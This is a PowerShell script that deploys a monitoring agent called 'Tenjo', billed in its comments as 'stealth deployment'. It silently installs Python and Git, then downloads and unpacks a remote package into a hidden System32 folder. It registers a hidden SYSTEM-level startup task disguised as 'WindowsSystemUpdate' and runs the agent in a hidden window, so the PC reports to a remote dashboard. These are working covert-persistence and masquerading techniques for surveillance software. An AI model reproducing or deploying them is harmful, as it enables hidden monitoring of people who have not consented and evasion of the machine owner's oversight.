# Tenjo PowerShell Deployment Script
# Copy-paste langsung di PowerShell Windows untuk stealth deployment

# Check if running as Administrator
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    Write-Host "❌ Script must run as Administrator!" -ForegroundColor Red
    Write-Host "Right-click PowerShell → Run as Administrator" -ForegroundColor Yellow
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host "🚀 Starting Tenjo Deployment..." -ForegroundColor Green
Write-Host "⏱️  This will take 3-5 minutes (including Python & Git install)..." -ForegroundColor Yellow

# Check and install Python 3.10
Write-Host "🐍 Checking Python installation..." -ForegroundColor Cyan
$pythonInstalled = $false
try {
    $pythonVersion = & python --version 2>&1
    if ($pythonVersion -match "Python 3\.(10|11|12)") {
        Write-Host "✅ Python $($pythonVersion) already installed" -ForegroundColor Green
        $pythonInstalled = $true
    }
} catch {
    Write-Host "❌ Python not found or incompatible version" -ForegroundColor Yellow
}

if (-not $pythonInstalled) {
    Write-Host "📥 Installing Python 3.10..." -ForegroundColor Cyan
    try {
        # Download Python 3.10 installer
        $pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
        $pythonInstaller = "$env:TEMP\python-3.10.11-amd64.exe"
        
        Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonInstaller -UseBasicParsing
        
        # Install Python silently with pip and PATH
        Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet", "InstallAllUsers=1", "PrependPath=1", "Include_pip=1" -Wait
        
        # Refresh environment variables
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
        
        # Verify installation
        Start-Sleep -Seconds 5
        $pythonVersion = & python --version 2>&1
        Write-Host "✅ Python installed: $pythonVersion" -ForegroundColor Green
        
        # Clean up installer
        Remove-Item $pythonInstaller -Force -ErrorAction SilentlyContinue
    } catch {
        Write-Host "❌ Python installation failed: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "⚠️  Continuing without Python - manual installation may be required" -ForegroundColor Yellow
    }
}

# Check and install Git (optional, for future updates)
Write-Host "📦 Checking Git installation..." -ForegroundColor Cyan
$gitInstalled = $false
try {
    $gitVersion = & git --version 2>&1
    if ($gitVersion -match "git version") {
        Write-Host "✅ Git already installed: $gitVersion" -ForegroundColor Green
        $gitInstalled = $true
    }
} catch {
    Write-Host "❌ Git not found" -ForegroundColor Yellow
}

if (-not $gitInstalled) {
    Write-Host "📥 Installing Git..." -ForegroundColor Cyan
    try {
        # Download Git installer
        $gitUrl = "https://github.com/git-for-windows/git/releases/download/v2.42.0.windows.2/Git-2.42.0.2-64-bit.exe"
        $gitInstaller = "$env:TEMP\Git-installer.exe"
        
        Invoke-WebRequest -Uri $gitUrl -OutFile $gitInstaller -UseBasicParsing
        
        # Install Git silently
        Start-Process -FilePath $gitInstaller -ArgumentList "/VERYSILENT", "/NORESTART", "/NOCANCEL", "/SP-", "/CLOSEAPPLICATIONS", "/RESTARTAPPLICATIONS", "/COMPONENTS=`"icons,ext\reg\shellhere,assoc,assoc_sh`"" -Wait
        
        # Refresh environment variables
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
        
        # Verify installation
        Start-Sleep -Seconds 3
        $gitVersion = & git --version 2>&1
        Write-Host "✅ Git installed: $gitVersion" -ForegroundColor Green
        
        # Clean up installer
        Remove-Item $gitInstaller -Force -ErrorAction SilentlyContinue
    } catch {
        Write-Host "⚠️  Git installation failed (non-critical): $($_.Exception.Message)" -ForegroundColor Yellow
        Write-Host "ℹ️  Git is optional - Tenjo will work without it" -ForegroundColor Cyan
    }
}

# Stop existing Tenjo process
Write-Host "🛑 Stopping existing Tenjo process..." -ForegroundColor Cyan
Get-Process -Name "python" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# Remove old installation
Write-Host "🗑️  Removing old installation..." -ForegroundColor Cyan
if (Test-Path "C:\Windows\System32\.tenjo") {
    Remove-Item "C:\Windows\System32\.tenjo" -Recurse -Force -ErrorAction SilentlyContinue
}

# Create installation directory
Write-Host "📁 Creating installation directory..." -ForegroundColor Cyan
New-Item -ItemType Directory -Path "C:\Windows\System32\.tenjo" -Force | Out-Null
New-Item -ItemType Directory -Path "C:\Windows\System32\.tenjo\src" -Force | Out-Null
New-Item -ItemType Directory -Path "C:\Windows\System32\.tenjo\src\core" -Force | Out-Null
New-Item -ItemType Directory -Path "C:\Windows\System32\.tenjo\src\modules" -Force | Out-Null
New-Item -ItemType Directory -Path "C:\Windows\System32\.tenjo\src\utils" -Force | Out-Null
New-Item -ItemType Directory -Path "C:\Windows\System32\.tenjo\logs" -Force | Out-Null

# Download installer package
Write-Host "📥 Downloading Tenjo installer..." -ForegroundColor Cyan
$installerUrl = "https://tenjo.adilabs.id/downloads/installer_package.tar.gz"
$installerPath = "$env:TEMP\tenjo_installer.tar.gz"

try {
    Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -UseBasicParsing
    Write-Host "✅ Download completed (29MB)" -ForegroundColor Green
} catch {
    Write-Host "❌ Download failed: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# Extract installer (using PowerShell 5.0+ built-in)
Write-Host "📦 Extracting installer files..." -ForegroundColor Cyan
try {
    # Use 7-Zip if available, otherwise try built-in methods
    if (Get-Command "7z" -ErrorAction SilentlyContinue) {
        & 7z x $installerPath -o"$env:TEMP\tenjo_extract" -y | Out-Null
    } else {
        # Try using tar command (Windows 10 1903+)
        if (Get-Command "tar" -ErrorAction SilentlyContinue) {
            & tar -xzf $installerPath -C "$env:TEMP"
        } else {
            Write-Host "⚠️  No extraction tool found. Trying alternative method..." -ForegroundColor Yellow
            # Alternative: rename to .zip and extract
            $zipPath = $installerPath -replace '\.tar\.gz$', '.zip'
            Rename-Item $installerPath $zipPath
            Expand-Archive -Path $zipPath -DestinationPath "$env:TEMP\tenjo_extract" -Force
        }
    }
    Write-Host "✅ Files extracted successfully" -ForegroundColor Green
} catch {
    Write-Host "❌ Extraction failed: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# Copy files to installation directory
Write-Host "📋 Installing Tenjo files..." -ForegroundColor Cyan
$extractPath = "$env:TEMP\tenjo_extract"
if (Test-Path $extractPath) {
    Copy-Item "$extractPath\*" -Destination "C:\Windows\System32\.tenjo\" -Recurse -Force
    Write-Host "✅ Files installed successfully" -ForegroundColor Green
} else {
    Write-Host "❌ Extracted files not found" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# Install Python dependencies
Write-Host "🐍 Installing Python dependencies..." -ForegroundColor Cyan
Set-Location "C:\Windows\System32\.tenjo"
try {
    # Upgrade pip first
    & python -m pip install --upgrade pip --quiet --no-warn-script-location
    
    # Install required dependencies
    & python -m pip install -r requirements.txt --quiet --no-warn-script-location --trusted-host pypi.org --trusted-host pypi.python.org --trusted-host files.pythonhosted.org
    
    Write-Host "✅ Dependencies installed successfully" -ForegroundColor Green
} catch {
    Write-Host "⚠️  Dependency installation warning: $($_.Exception.Message)" -ForegroundColor Yellow
    Write-Host "🔧 Attempting alternative installation..." -ForegroundColor Cyan
    
    # Try installing critical packages individually
    try {
        & python -m pip install requests psutil pillow --quiet --no-warn-script-location --trusted-host pypi.org --trusted-host pypi.python.org --trusted-host files.pythonhosted.org
        Write-Host "✅ Critical dependencies installed" -ForegroundColor Green
    } catch {
        Write-Host "❌ Critical dependency installation failed" -ForegroundColor Red
        Write-Host "⚠️  Tenjo may not function properly" -ForegroundColor Yellow
    }
}

# Create scheduled task for startup
Write-Host "⚙️  Creating startup task..." -ForegroundColor Cyan
try {
    $action = New-ScheduledTaskAction -Execute "python" -Argument "C:\Windows\System32\.tenjo\main.py" -WorkingDirectory "C:\Windows\System32\.tenjo"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit ([TimeSpan]::Zero)
    $principal = New-ScheduledTaskPrincipal -UserID "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    
    Register-ScheduledTask -TaskName "WindowsSystemUpdate" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
    Write-Host "✅ Startup task created" -ForegroundColor Green
} catch {
    Write-Host "❌ Failed to create startup task: $($_.Exception.Message)" -ForegroundColor Red
}

# Start Tenjo service
Write-Host "🚀 Starting Tenjo service..." -ForegroundColor Cyan
try {
    Start-Process -FilePath "python" -ArgumentList "C:\Windows\System32\.tenjo\main.py" -WorkingDirectory "C:\Windows\System32\.tenjo" -WindowStyle Hidden
    Write-Host "✅ Tenjo service started" -ForegroundColor Green
} catch {
    Write-Host "❌ Failed to start service: $($_.Exception.Message)" -ForegroundColor Red
}

# Cleanup temporary files
Write-Host "🧹 Cleaning up temporary files..." -ForegroundColor Cyan
Remove-Item $installerPath -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\tenjo_extract" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\*.tmp" -Force -ErrorAction SilentlyContinue

# Final verification
Write-Host "`n╔══════════════════════════════════════╗" -ForegroundColor White
Write-Host "║          DEPLOYMENT SUMMARY          ║" -ForegroundColor White  
Write-Host "╚══════════════════════════════════════╝" -ForegroundColor White

# Check if process is running
$tenjoProcess = Get-Process -Name "python" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*\.tenjo\*" }
if ($tenjoProcess) {
    Write-Host "✅ Process: Running (PID: $($tenjoProcess.Id))" -ForegroundColor Green
} else {
    Write-Host "❌ Process: Not running" -ForegroundColor Red
}

# Check if files exist
if (Test-Path "C:\Windows\System32\.tenjo\main.py") {
    Write-Host "✅ Files: Installed successfully" -ForegroundColor Green
} else {
    Write-Host "❌ Files: Installation failed" -ForegroundColor Red
}

# Check if scheduled task exists
$task = Get-ScheduledTask -TaskName "WindowsSystemUpdate" -ErrorAction SilentlyContinue
if ($task) {
    Write-Host "✅ Startup: Configured for system boot" -ForegroundColor Green
} else {
    Write-Host "❌ Startup: Not configured" -ForegroundColor Red
}

Write-Host "`n🎉 Deployment completed!" -ForegroundColor Green
Write-Host "📊 Monitor dashboard: https://tenjo.adilabs.id" -ForegroundColor Cyan
Write-Host "⏰ This PC will appear online within 1-2 minutes" -ForegroundColor Yellow

Write-Host "`nPress Enter to exit and close window..." -ForegroundColor White
Read-Host